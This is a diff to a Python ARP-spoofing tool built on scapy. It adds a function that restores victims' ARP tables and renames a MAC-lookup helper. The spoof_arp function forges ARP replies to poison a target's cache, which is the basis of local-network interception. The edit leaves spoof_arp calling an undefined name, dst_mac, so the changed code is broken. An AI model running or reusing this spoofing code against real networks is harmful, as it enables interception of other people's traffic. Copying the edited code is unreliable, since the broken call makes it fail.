@@ -10,7 +10,16 @@ def valid_ip4(address):
     except AttributeError:
         return False
 
-def get_dst_mac(ip):
+def restore_arp_tables(dst, src):
+    dst_mac = get_mac(dst)
+    src_mac = get_mac(src)
+    if dst_mac != False and src_mac != False:
+        packet = scapy.ARP(op=2, pdst=dst, hwdst=dst_mac, psrc=src, hwsrc=src_mac)
+        scapy.send(packet, verbose=False)
+        return True
+    return False
+
+def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = broadcast/arp_req
@@ -22,7 +31,7 @@ def get_dst_mac(ip):
         return False
 
 def spoof_arp(dst, src):
-    mac = get_dst_mac(dst)
+    mac = dst_mac(dst)
     if mac != False:
         packet = scapy.ARP(op=2, hwdst=mac, pdst=dst, psrc=src)
         scapy.send(packet, verbose=False)
